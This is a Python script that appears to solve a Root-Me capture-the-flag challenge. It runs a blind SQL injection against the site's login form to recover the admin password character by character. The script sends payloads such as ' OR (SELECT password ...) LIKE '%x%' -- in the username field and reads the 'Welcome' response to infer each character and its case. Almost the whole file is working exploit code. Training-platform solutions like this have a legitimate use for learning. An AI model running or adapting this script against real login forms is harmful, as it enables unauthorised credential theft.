import requests, string, re

url = "http://challenge01.root-me.org/web-serveur/ch10/"

def main():
    password_caractere = trouverCaractere(url)
    trouverPosition(url, password_caractere)

def trouverCaractere(url):
    nombre_requete = 0
    chiffres = ""
    caractere_dans_passwd = ""
    for i in range(10):
        chiffres += str(i)
    caractere_list = str(string.ascii_lowercase) + str(chiffres)
    for i in caractere_list:
        requete = f"' OR (SELECT password where username = 'admin' ) LIKE '%{i}%' --"
        r = requests.post(url, data={'username': requete, 'password': "a"})
        nombre_requete += 1
        html_reponse = r.text
        matches = re.search(r"Welcome", html_reponse)
        try:
            if matches.group(0) == "Welcome":
                requete2 = f"' OR (SELECT password where username = 'admin' ) GLOB '*{i.upper()}*' --"
                r2 = requests.post(url, data={'username': requete2, 'password': "a"})
                nombre_requete += 1
                html_reponse2 = r2.text
                matches2 = re.search(r"Welcome", html_reponse2)
                try:
                    if matches2.group(0) == "Welcome":
                        caractere_dans_passwd = str(caractere_dans_passwd) + str(i.upper())
                except:
                    caractere_dans_passwd = str(caractere_dans_passwd) + str(i)
        except:
            pass
    print(f"Nombre de requetes fonction 1 = {nombre_requete}")
    return caractere_dans_passwd

def trouverPosition(url, caracteres):
    tab = ['_','_','_','_','_','_','_','_']
    tab2 = ['','','','','','','','']
    position = ""
    password = ""
    nombreRequete = 0
    for i in caracteres:
        for n in range(len(tab)):
            if tab[n] == '_':
                tab[n] = i
                for j in tab:
                    position += j
            requete = f"' OR (SELECT password where username = 'admin' ) LIKE '{position}' --"
            r = requests.post(url, data={'username': requete, 'password': "a"})
            nombreRequete += 1
            html_reponse = r.text
            matches = re.search(r"Welcome", html_reponse) 
            try:
                if matches.group(0) == "Welcome":
                    compteur = 1
                    for k in position:
                        if i == k:
                            tab2[compteur-1] = k
                        else:
                            compteur = compteur + 1
            except:
                pass
            position = ""
            tab = ['_','_','_','_','_','_','_','_']
    password = ""
    for i in tab2:
        password += i
    print(f"Nombre de requetes fonction 2 = {nombreRequete}")
    print(f"le flag est : {password}")


if __name__=="__main__":
    main()
